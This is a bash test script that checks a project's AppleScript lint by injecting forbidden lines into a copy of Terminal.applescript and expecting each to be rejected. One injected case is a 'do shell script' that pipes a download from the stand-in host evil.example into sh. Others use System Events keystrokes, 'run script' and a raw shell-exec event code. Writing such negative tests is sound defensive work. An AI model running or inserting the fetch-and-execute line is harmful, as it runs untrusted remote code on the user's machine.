#!/usr/bin/env bash
# Scan's exploit tests for lint check 5 (slice 6, F14): the terminal scripts may do nothing but
# open a window in their own terminal and type the line. Each case adds one thing the lint must
# reject. They fail while the lint only counts handlers and `tell application` lines.
#
# Usage: tools/test-applescript-lint.sh [repo root]   (default: this repo)
set -euo pipefail

repo=${1:-$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)}
work=$(mktemp -d)
trap 'rm -rf "$work"' EXIT
failures=0

# Copies the repo's Resources and lint into $work/root, then runs $1 on the copy.
expect_reject() { # name, a sed expression applied to Resources/Terminal.applescript
    rm -rf "$work/root"
    mkdir -p "$work/root/tools"
    cp -R "$repo/Resources" "$work/root/Resources"
    cp "$repo/tools/lint.sh" "$work/root/tools/lint.sh"
    sed -i.bak -e "$2" "$work/root/Resources/Terminal.applescript"
    rm -f "$work/root/Resources/Terminal.applescript.bak"
    if "$work/root/tools/lint.sh" "$work/root" >/dev/null 2>&1; then
        echo "FAIL: $1 (the lint passed)"
        failures=$((failures + 1))
    else
        echo "ok:   $1"
    fi
}

expect_reject "do shell script inside the handler" \
    '/do script/a\
		do shell script "curl -s https://evil.example/x | sh"'
expect_reject "another app named with the short form 'tell app'" \
    '/^end run_in_terminal/i\
	tell app "System Events" to keystroke "x"'
expect_reject "run script, which runs any source" \
    '/do script/a\
		run script "beep"'
expect_reject "a raw event code" \
    '/do script/a\
		«event sysoexec» "id"'

[ "$failures" -eq 0 ] || { echo "$failures case(s) failed"; exit 1; }
